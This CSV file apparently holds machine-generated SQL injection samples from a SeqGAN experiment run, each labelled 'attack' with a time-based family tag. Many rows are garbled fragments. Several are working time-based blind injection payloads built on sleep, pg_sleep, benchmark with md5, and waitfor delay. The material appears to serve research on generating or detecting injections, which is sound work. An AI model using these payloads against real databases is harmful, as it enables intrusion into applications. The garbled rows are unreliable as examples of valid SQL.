label,payload,family,payload_type,method,run_id,sample_index
attack,  (      as xar,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,89
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'chf' like 'oioi'  =  'n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,90
attack,"1""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,91
attack,"1  )     and    (    (5 e"" like ""w p'  =  'n ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,92
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'ando@bp""   )    )    rlike sleep  (  5  )   and    (    (   ""h",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,93
attack,100:5' and   (  'zfpiu'  =  'n,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,94
attack,1'   )   as blthc where 8594   r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,95
attack,1%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,96
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%""   )    )    rlike sleep  (  5  )   and    (    (   ""%z",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,97
attack,  select * where 1132 )    (  (  select 2388  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,98
attack,"1""  )   or where eiq 7279 j  =      ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,99
attack,1%hvz'  =  'fvi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,100
attack,1lp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,101
attack,0x4c4d6142 jd,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,102
attack,1%w,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,103
attack," select * 4240  (  5000000,mdt  =  =  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,104
attack,select * where ]not  benchmark  5  (  benchmark  )   or,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,105
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and ' or or 1132  =  benchmark  (  (  (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,106
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%pnfxi",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,107
attack,  benchmark  =  )   and    as,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,108
attack,"  ""zlal"" or eld  = where 7305  (  6175  (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,109
attack,1%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,110
attack,1%zh,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,111
attack,"(1 or or 2841  =    (    (  ""wucy"" * 5000000",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,112
attack,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zhvinf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,113
attack,"1'   )    )     )   and sleep  (  5  )   and    (    (     (  '"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""oioiu0:5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,114
attack,"select z  m"" like ""  =    )    as as eew",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,115
attack,"  benchmark  ""wucy"" 4240 where 6793  7279 6793  =  (  select",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,116
attack,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'u",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,117
attack,select * 8514  =  ) *saw where e a,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,118
attack,"1 where 8594  =  benchmark  5000000,md5  (  =  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,119
attack,1'  )   waitfor delay 'or bijhf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,120
attack,1'+  (  select 'zoin,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,121
attack,1%bs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,122
attack,1'  sleep   )    )    as 6793as'  =  'vtaa,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,123
attack,"1"" where    (    (  select * or 6969  = i",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,124
attack,1sushw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,125
attack,"1 or from 6175    (  (  ""uvzc""  )   (    )",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,126
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%'  =  '%'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,127
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,128
attack, where 4240 pi   pg_sleep  (  select (     (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,129
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,130
attack,1' or 4240 elielireu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,131
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and ''   )    )     )   and sleep  (  5  )   and    (    (     (  'vi",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,132
attack,"1""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,133
attack,"1%""  =  ""h"" like ""ojt",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,134
attack,select 6793 6793  1132 8514  select eli xhli,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,135
attack,1 or bmp  =  benchmark  =  benchmark  =  (  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,136
attack,"1%""""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""y",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,137
attack,1%f'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,138
attack,1 and    as ew pjpe 8514  =  6175,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,139
attack,select 6793  (  5  1210  benchmark  (  (%bmdi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,140
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""ppn'  =  'nmpbi",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,141
attack,"1"" ,' and elt  (  1210  =  1210,sleep  (  5   )    )    and '        )    )    )   as `",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,142
attack,1%lz wherel5 phs,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,143
attack,"1""w  )   or elike or 6793  1568  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,144
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and ''   )    )     )   waitfor delay ' ppn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,145
attack,w  (  _ and eleruefu e`h,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,146
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'xi'  =  'pbii",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,147
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%'  =  'fn'  =  ' bn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,148
attack,1%'  )    )     and el  =  6175  7196   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,149
attack,1'  )   where 7279 where=  5  benchmark  5000000(  (,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,150
attack,select 8485  and elt  i  )(  )    as ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,151
attack,"1%""  =  ""fy",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,152
attack,2239 6793 eliu or where 6967    (  select or,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,153
attack,select * * elt  (     (  5  r where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,154
attack,1%'  =  'hv'hw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,155
attack,"1%"" and eliesielbialta",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,156
attack,1'||  (  select 'oj0:0:5' and   (  'vy'  =  'pp,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,157
attack, 6793 j  =  benchmark  )  )   and    (         )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,158
attack,"1""  )   )     as and    =  ' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ' or ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,159
attack,1%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,160
attack,select 6793 x(  )   (  sleep  (  5  ) where,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,161
attack,"1""  )   and elikelt  8485  (  5",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,162
attack, select 6793 4240  =  7021 4240 m7021 or or ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,163
attack,1bfs b(p d eld eawu ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V3__sql_aware__len20__gpre80__reward_off__seed88,164
